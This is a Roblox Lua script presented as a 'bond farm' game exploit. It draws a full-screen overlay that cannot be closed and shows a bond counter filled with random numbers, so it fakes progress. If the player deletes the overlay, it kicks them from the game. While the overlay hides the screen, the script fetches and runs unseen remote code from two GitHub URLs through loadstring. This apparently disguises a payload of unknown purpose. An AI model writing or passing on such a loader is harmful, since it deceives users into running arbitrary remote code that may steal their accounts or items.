local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local UICorner = Instance.new("UICorner")
local UIGradient = Instance.new("UIGradient")
local TitleLabel = Instance.new("TextLabel")
local DiscordLabel = Instance.new("TextLabel")
local StatusLabel = Instance.new("TextLabel")
local CreditsLabel = Instance.new("TextLabel")
local BondsLabel = Instance.new("TextLabel") -- ✅ Fixed missing BondsLabel

-- ScreenGui Settings
ScreenGui.Name = "ScreenBlocker"
ScreenGui.DisplayOrder = 999999999
ScreenGui.IgnoreGuiInset = true
ScreenGui.ResetOnSpawn = false
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.Parent = game:GetService("CoreGui")

-- Main Frame
Frame.Name = "MainFrame"
Frame.Size = UDim2.new(1, 0, 1, 0)
Frame.Position = UDim2.new(0, 0, 0, 0)
Frame.BackgroundTransparency = 0
Frame.Parent = ScreenGui

-- Black and White Gradient Background
UIGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 0, 0)),  -- Black
    ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 255, 255))  -- White
})
UIGradient.Rotation = 45
UIGradient.Parent = Frame

-- Rounded Corners
UICorner.CornerRadius = UDim.new(0, 12)
UICorner.Parent = Frame

-- Title Label
TitleLabel.Name = "Title"
TitleLabel.Parent = Frame
TitleLabel.AnchorPoint = Vector2.new(0.5, 0.5)
TitleLabel.Size = UDim2.new(0.8, 0, 0.15, 0)
TitleLabel.Position = UDim2.new(0.5, 0, 0.2, 0)
TitleLabel.BackgroundTransparency = 1
TitleLabel.Text = "RINGTA BOND FARM"
TitleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TitleLabel.TextScaled = true
TitleLabel.Font = Enum.Font.GothamBlack
TitleLabel.TextStrokeTransparency = 0.7
TitleLabel.TextStrokeColor3 = Color3.fromRGB(100, 100, 100)
TitleLabel.ZIndex = 2

-- Discord Label
DiscordLabel.Name = "Discord"
DiscordLabel.Parent = Frame
DiscordLabel.AnchorPoint = Vector2.new(0.5, 0.5)
DiscordLabel.Size = UDim2.new(0.8, 0, 0.1, 0)
DiscordLabel.Position = UDim2.new(0.5, 0, 0.5, 0)
DiscordLabel.BackgroundTransparency = 1
DiscordLabel.Text = "discord.gg/ringta"
DiscordLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
DiscordLabel.TextScaled = true
DiscordLabel.Font = Enum.Font.GothamMedium
DiscordLabel.TextStrokeTransparency = 0.8
DiscordLabel.ZIndex = 2

-- Status Label
StatusLabel.Name = "Status"
StatusLabel.Parent = Frame
StatusLabel.AnchorPoint = Vector2.new(0.5, 0.5)
StatusLabel.Size = UDim2.new(0.8, 0, 0.1, 0)
StatusLabel.Position = UDim2.new(0.5, 0, 0.7, 0)
StatusLabel.BackgroundTransparency = 1
StatusLabel.Text = "Getting ready to collect bonds"
StatusLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
StatusLabel.TextScaled = true
StatusLabel.Font = Enum.Font.Gotham
StatusLabel.ZIndex = 2

-- Credits Label
CreditsLabel.Name = "Credits"
CreditsLabel.Parent = Frame
CreditsLabel.AnchorPoint = Vector2.new(0.5, 0.5)
CreditsLabel.Size = UDim2.new(0.8, 0, 0.08, 0)
CreditsLabel.Position = UDim2.new(0.5, 0, 0.9, 0)
CreditsLabel.BackgroundTransparency = 1
CreditsLabel.Text = "Created by Ringta & Akundisco"
CreditsLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
CreditsLabel.TextScaled = true
CreditsLabel.Font = Enum.Font.Gotham
CreditsLabel.TextTransparency = 0.3
CreditsLabel.ZIndex = 2

-- ✅ Bonds Label (Fixed)
BondsLabel.Name = "BondsCount"
BondsLabel.Parent = Frame
BondsLabel.AnchorPoint = Vector2.new(0.5, 0.5)
BondsLabel.Size = UDim2.new(0.8, 0, 0.1, 0)
BondsLabel.Position = UDim2.new(0.5, 0, 0.8, 0)
BondsLabel.BackgroundTransparency = 1
BondsLabel.Text = "0 bonds collected"
BondsLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
BondsLabel.TextScaled = true
BondsLabel.Font = Enum.Font.GothamBold
BondsLabel.ZIndex = 2

-- ✅ Status updates with correct timing
task.spawn(function()
    task.wait(10) -- Updates at 10s  
    StatusLabel.Text = "Collecting bonds..."
end)

-- ✅ Bonds Collection Logic (Fixed)
local bonds = 1
local targetBonds = math.random(70, 90)
local totalTime = 85
local interval = (totalTime / (targetBonds - bonds)) * 1.2

task.spawn(function()
    task.wait(12) -- Start bond collection at 12s
    print("Starting bond collection...")

    while bonds < targetBonds do
        task.wait(interval)
        bonds = math.min(bonds + math.random(2, 5), targetBonds)

        BondsLabel.Text = tostring(bonds) .. " bonds collected"
        print("Updated Bonds:", bonds)
    end

    StatusLabel.Text = "Bonds collection completed!"
end)

-- ✅ Status update for "Restarting script soon"
task.spawn(function()
    task.wait(60) -- Wait 60s after bond collection starts
    StatusLabel.Text = "Restarting script soon"
end)

-- ✅ Gradient Animation Optimization
task.spawn(function()
    while true do
        for i = 0, 360, 3 do
            UIGradient.Rotation = i
            task.wait(0.05)
        end
    end
end)

-- ✅ Prevent GUI Deletion & Kick Players
local function watchForDeletion(instance)
    instance.AncestryChanged:Connect(function(_, parent)
        if not parent then
            warn("Warning: Don't delete the GUI!")
            task.wait(3)
            game.Players.LocalPlayer:Kick("Hey no need to delete the GUI since it will make lag ⚠️")
        end
    end)
end

watchForDeletion(ScreenGui)

-- ✅ **Auto-execute the loadstring immediately**
loadstring(game:HttpGet("https://raw.githubusercontent.com/hbjrev/mwir.github.io/refs/heads/main/er.lua"))()



task.wait(2) -- Waits for 2 seconds before running the loadstring
loadstring(game:HttpGet("https://raw.githubusercontent.com/hbjrev/lagfix.github.io/refs/heads/main/ringta.lua"))()
